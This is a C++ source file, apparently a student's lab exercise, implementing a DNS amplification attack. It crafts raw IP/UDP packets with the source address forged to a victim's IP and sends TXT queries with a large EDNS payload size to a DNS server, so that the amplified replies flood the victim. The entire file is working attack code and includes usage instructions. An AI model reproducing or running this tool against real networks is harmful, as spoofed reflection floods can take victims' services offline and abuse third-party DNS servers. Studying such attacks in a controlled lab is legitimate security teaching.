#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>

typedef struct{
    uint16_t queryid;
    uint16_t flags;
    uint16_t qcount;
    uint16_t anscount;
    uint16_t authcount;
    uint16_t addlcount;
}dnshdr;

uint16_t checksum(uint16_t*,int);

using namespace std;

int main(int argc, char **argv){ // ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>

    if(argc != 4){
        cout << "argc must be 4" << endl;
        return 1;
    }
    srand(time(NULL));

    int sockfd = socket(PF_INET,SOCK_RAW,IPPROTO_UDP);
    cout << sockfd << endl;

    char buffer[65536];
    memset(buffer, 0, sizeof(buffer));

    // IP_HDRINCL: write IP header by myself
    int one = 1;
    const int *val = &one;
    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one));

    // query website: microsoft.com, spotify.com

    for (int i = 0; i < 3;i++){

        // dns server address infomation
        struct sockaddr_in dnsaddr;
        bzero(&dnsaddr, sizeof(dnsaddr));
        dnsaddr.sin_family = PF_INET;
        dnsaddr.sin_port = 53;
        inet_pton(PF_INET, argv[3],&dnsaddr.sin_addr);

        // IP header
        struct iphdr *ip = (struct iphdr *) buffer;

        ip->ihl = 5; // header length
        ip->version = 4;
        ip->tos = 0x00; // type of service
        // ip->tot_len; // total length = 20(IP header) + 8(UDP header) + (DNS data)
        ip->id = rand() & 0xFFFF; // identification
        ip->frag_off = 0x00; // flag & fragment offset field
        ip->ttl = 64; // time to live
        ip->protocol = IPPROTO_UDP; // UDP = 17
        ip->check = 0x0000; // checksum
        ip->saddr; // source address
        inet_pton(AF_INET,argv[1],&ip->saddr);
        ip->daddr; // destination address
        inet_pton(AF_INET,argv[3],&ip->daddr);
        // ip->check = checksum((uint16_t*)ip,sizeof(struct iphdr)/2);


        // UDP header
        struct udphdr *uh = (struct udphdr *)(buffer + sizeof(struct iphdr));
        // struct udphdr *uh = (struct udphdr *)(buffer);

        uh->source = htons(atoi(argv[2]));
        uh->dest = htons(53);
        // uh->len; // udp length = 8(UDP header) + (DNS data)
        uh->check = 0x0000; // checksum

        // DNS header
        dnshdr *dh = (dnshdr *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr));

        dh->queryid = htons(0x73e6); // transaction ID (student id in hex)
        dh->flags = htons(0x0100); // 0x0120 standard query
        dh->qcount = htons(1); // 1
        dh->anscount = htons(0); // 0
        dh->authcount = htons(0); // 0
        dh->addlcount = htons(1); // 1

        // DNS data (query)
        char dnsdata[] = {0x09,'m','i','c','r','o','s','o','f','t',0x03,'c','o','m',0x00, // domain name
                        0x00,0x10,    // type: TXT
                        0x00,0x01     // class: IN
        };
        memcpy(buffer+sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dnshdr),dnsdata,sizeof(dnsdata));

        // Additional RRs
        unsigned char add_record[] = {0x00,      // name: <ROOT>
                            0x00,0x29, // type: OPT
                            0x10,0x00, // UDP playload size
                            0x00,      // higher bits in extended RCODE
                            0x00,      // EDNS0 version
                            0x00,0x00, // Z
                            0x00,0x00  // data length
                            // 0x00,0x0c, // data length
                            // 0x00,0x0a, // option code: cookie
                            // 0x00,0x08, //` option length
                            // 0xa4,0xe1,0x6d,0x62,0x14,0x78,0x74,0x57 // option data
        };
        memcpy(buffer+sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dnshdr)+sizeof(dnsdata),add_record,sizeof(add_record));

        size_t pktsize = sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dnshdr)+sizeof(dnsdata)+sizeof(add_record);

        ip->tot_len = htons(pktsize); // total length = 20(IP header) + 8(UDP header) + (DNS data)
        uh->len = htons(pktsize - sizeof(struct iphdr)); // udp length = 8(UDP header) + (DNS data)
        ip->check = checksum((uint16_t*)ip,sizeof(struct iphdr)/2);
        // uh->check = checksum((uint16_t *)(buffer + 12), (pktsize - 12)/2);
        uh->check = 0x0000;
        cout << dec << "pktsize: " << pktsize << endl;

        // send packet
        sendto(sockfd, buffer, pktsize, 0, (sockaddr *)&dnsaddr, sizeof(dnsaddr));
    }

    return 0;
}

uint16_t checksum(uint16_t* buffer,int num){
    uint64_t cksum64 = 0;
    for (int i = 0; i < num;i++){
        cksum64 += buffer[i];
    }
    cout << hex << cksum64 << endl;
    while(cksum64 > 0xFFFF){
        // cksum64 = (cksum64 >> 16) + (cksum64 & 0xFFFF);
        unsigned int temp = cksum64 & 0xFFFF;
        cksum64 >>= 16;
        while(cksum64 > 0){
            temp += cksum64 & 0xFFFF;
            cksum64 >>= 16;
        }
        cksum64 = temp;
    }
    uint16_t cksum16 = cksum64;
    return ~cksum16;
}